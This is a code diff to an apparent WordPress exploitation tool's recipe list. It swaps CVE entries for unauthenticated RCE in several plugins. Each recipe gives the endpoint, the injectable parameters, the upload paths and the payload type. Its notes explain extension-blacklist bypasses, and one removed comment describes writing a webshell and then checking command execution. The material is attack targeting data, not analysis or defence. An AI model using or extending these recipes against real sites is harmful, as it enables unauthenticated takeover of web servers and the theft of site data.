@@ -163,75 +163,6 @@ RECIPES = [
                 "default) and comments open on the target post.",
     },
     {
-        "plugin": "w3-total-cache",
-        "cve": "CVE-2025-9501",
-        "affected": "<2.8.13",
-        "mode": "w3-comment-injection",
-        "method": "POST",
-        "endpoint": "/wp-comments-post.php",
-        "params": {"post_id": 1},
-        "comment_field": "comment",
-        "author_field": "author",
-        "email_field": "email",
-        "upload_path": "/wp-content/plugins/w3-total-cache/{filename}",
-        "payload_type": "eval-injection",
-        "source": "registry",
-        # CVE-2025-9501: W3 Total Cache _parse_dynamic_mfunc() command injection.
-        # The plugin's fragment/object cache processing improperly handles comment
-        # content submitted via wp-comments-post.php, allowing unauthenticated
-        # attacker to inject arbitrary PHP code through the comment mechanism.
-        # When W3TC processes the cache payload, the injected code is evaluated,
-        # allowing direct PHP execution and arbitrary file writes. The handler
-        # crafts a payload that exploits this to write a webshell to the plugin
-        # directory, then verifies command execution.
-        "note": "Unauth PHP command injection (CVE-2025-9501, W3 Total Cache "
-                "<2.8.13): _parse_dynamic_mfunc() improperly processes comment "
-                "content, allowing arbitrary PHP eval through the cache layer. "
-                "Payload submitted via wp-comments-post.php exploits dynamic "
-                "mfunc parsing to write and execute arbitrary PHP. No auth, no "
-                "nonce required; unauthenticated users can submit comments and "
-                "trigger payload evaluation.",
-    },
-    {
-        "plugin": "sneeit-framework",
-        "cve": "CVE-2025-6389",
-        "affected": "<=8.3",
-        "mode": "sneeit-callback-injection",
-        "method": "POST",
-        "endpoint": "/wp-admin/admin-ajax.php",
-        "params": {"action": "sneeit_articles_pagination"},
-        "inject_param": "callback",
-        "upload_path": "/wp-content/plugins/sneeit-framework/{filename}",
-        "payload_type": "call-user-func-injection",
-        "source": "registry",
-        "note": "Unauth PHP code injection (CVE-2025-6389, Sneeit Framework "
-                "<=8.3): sneeit_articles_pagination_callback() passes the "
-                "'callback' parameter directly to call_user_func() without "
-                "sanitization, allowing arbitrary PHP execution. Payload "
-                "submitted via wp-admin/admin-ajax.php with no authentication. "
-                "131K+ attacks recorded since discovery.",
-    },
-    {
-        "plugin": "wpvivid-backuprestore",
-        "cve": "CVE-2026-1357",
-        "affected": "<=0.9.123",
-        "mode": "wpvivid-encrypted-upload",
-        "method": "POST",
-        "endpoint": "/wp-admin/admin-ajax.php",
-        "params": {"action": "wpvivid_action", "method": "send_to_site"},
-        "field": "wpvivid_payload",
-        "upload_path": "/wp-content/uploads/{filename}",
-        "encryption_key": None,
-        "payload_type": "path-traversal-upload",
-        "source": "registry",
-        "note": "Unauth file upload RCE (CVE-2026-1357, WPvivid <=0.9.123): "
-                "RSA decryption failure passes false to AES cipher, creating "
-                "predictable null-byte encryption key. Combined with missing "
-                "filename sanitization, enables path traversal to upload "
-                "arbitrary PHP to web-accessible directories. No authentication "
-                "required. 900K+ installations targeted.",
-    },
-    {
         "plugin": "wordpress-core",
         "cve": "CVE-2026-63030",
         "affected": ">=6.9.0,<6.9.5|>=7.0.0,<7.0.2",
@@ -298,6 +229,37 @@ RECIPES = [
                 "<=1.9.6): render_element nonce publicly available on homepage, "
                 "queryEditor parameter passed to eval() without sanitization. "
                 "CVSS 9.8-10.0. Exploited within hours of disclosure.",
+    },
+    {
+        "plugin": "front-end-users",
+        "cve": "CVE-2025-2005",
+        "affected": "<=3.2.32",
+        "method": "POST",
+        "endpoint": "/wp-admin/admin-ajax.php",
+        "params": {"action": "feu_upload_file"},
+        "field": "file",
+        "upload_path": "/wp-content/uploads/feu-files/{filename}",
+        "source": "registry",
+        "note": "Unauth arbitrary file upload RCE (CVE-2025-2005, Front End Users "
+                "<=3.2.32): Public registration form lacks MIME type and extension "
+                "validation on uploaded files. No authentication required. Files "
+                "are directly accessible from web root and execute as PHP. CVSS 9.8.",
+    },
+    {
+        "plugin": "drag-drop-multiple-file-upload-cf7",
+        "cve": "CVE-2025-3515",
+        "affected": "<=1.3.8.9",
+        "method": "POST",
+        "endpoint": "/wp-admin/admin-ajax.php",
+        "params": {"action": "dnd_upload_cf7"},
+        "field": "dnd_file",
+        "upload_path": "/wp-content/uploads/dnd-cf7/{filename}",
+        "source": "registry",
+        "note": "Unauth file upload RCE via extension blacklist bypass (CVE-2025-3515, "
+                "Drag and Drop Multiple File Upload for CF7 <=1.3.8.9): Plugin blocks "
+                ".php but not .phar, .php5, .inc. On Apache+mod_php, .phar files "
+                "execute as PHP. No authentication. Publicly accessible Contact Form 7 "
+                "interface. CVSS 9.8.",
     },
 ]
 
